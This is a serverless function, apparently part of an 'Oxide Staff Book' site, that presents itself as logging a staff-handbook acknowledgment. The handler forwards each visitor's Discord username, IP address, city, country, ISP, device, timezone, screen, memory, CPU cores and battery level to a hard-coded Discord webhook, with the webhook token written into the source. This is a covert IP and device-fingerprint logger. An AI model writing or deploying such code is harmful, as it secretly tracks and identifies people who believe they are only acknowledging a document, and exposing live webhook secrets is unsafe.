const fetch = require("node-fetch");

const WEBHOOK_URL = "https://discord.com/api/webhooks/1502218610729287791/4eO3ZJ2NlbwDu33TxJ5xJqr5cE2LKmoBJQheB77bOu67TH-vzCq31lmJ3FoHmMuLNukD";

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const body = JSON.parse(event.body);
    const now = new Date();

    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "📋 Staff Book Acknowledged",
          color: 0xff00ff,
          fields: [
            { name: "👤 Discord Username", value: body.username || "Unknown", inline: true },
            { name: "🌐 IP Address", value: body.ip || "Unknown", inline: true },
            { name: "📍 Location", value: (body.city || "?") + ", " + (body.country || "?"), inline: true },
            { name: "📡 ISP", value: body.isp || "Unknown", inline: false },
            { name: "📱 Device", value: body.device || "Unknown", inline: false },
            { name: "🕐 Timezone", value: body.timezone || "Unknown", inline: true },
            { name: "🗣️ Language", value: body.language || "Unknown", inline: true },
            { name: "🖥️ Screen", value: body.screen || "Unknown", inline: true },
            { name: "💾 Memory", value: body.memory || "Unknown", inline: true },
            { name: "⚙️ CPU Cores", value: String(body.cores || "Unknown"), inline: true },
            { name: "🔋 Battery", value: body.battery || "Unknown", inline: true }
          ],
          footer: { text: "Oxide Staff Book • " + now.toUTCString() },
          timestamp: now.toISOString()
        }]
      })
    });

    if (!response.ok) {
      throw new Error(`Discord API error: ${response.statusText}`);
    }

    return { statusCode: 200, body: "OK" };
  } catch (error) {
    console.error("Error:", error);
    return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
  }
};

